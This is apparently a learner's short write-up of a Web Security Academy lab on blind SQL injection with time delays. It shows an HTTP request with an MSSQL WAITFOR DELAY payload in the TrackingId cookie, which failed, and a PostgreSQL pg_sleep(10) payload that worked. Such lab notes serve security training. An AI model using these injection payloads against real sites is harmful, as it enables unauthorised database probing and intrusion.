# Blind SQL injection with time delays

### Besides trackingid added a delay for checking microsoft database but got the response immeditately after sending it .
```http
GET /filter?category=Pets HTTP/2
Host: 0a3400020396c7bf8193986e00740094.web-security-academy.net
Cookie: TrackingId=yDWmc5ai65PZq3JJ'||WAITFOR DELAY '0:0:10'--; session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3400020396c7bf8193986e00740094.web-security-academy.net/filter?category=Pets
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
# This doesn't work , so next I used it for postgresql , and it worked . After 10 second I got the response .  

```http
Cookie: TrackingId=yDWmc5ai65PZq3JJ'||pg_sleep(10)--;
```
